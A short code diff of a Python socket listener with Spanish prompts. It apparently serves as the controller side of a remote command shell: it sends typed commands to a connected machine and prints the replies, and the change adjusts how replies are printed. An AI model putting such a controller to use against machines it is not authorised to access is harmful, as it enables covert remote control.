@@ -8,6 +8,8 @@ def listen():
     print('[+] Esperando conexión...')
     conn, addr = servidor.accept()
     print(f'[+] Conectado desde {addr}')
+    active = conn.recv(1024).decode()
+    print(active)
 
     while True:
         comando = input('>>> ')
@@ -16,7 +18,7 @@ def listen():
             break
         conn.send(comando.encode())
         respuesta = conn.recv(1024 * 10).decode()
-        print(json.loads(respuesta))
+        print(respuesta)
     
     conn.close()
 
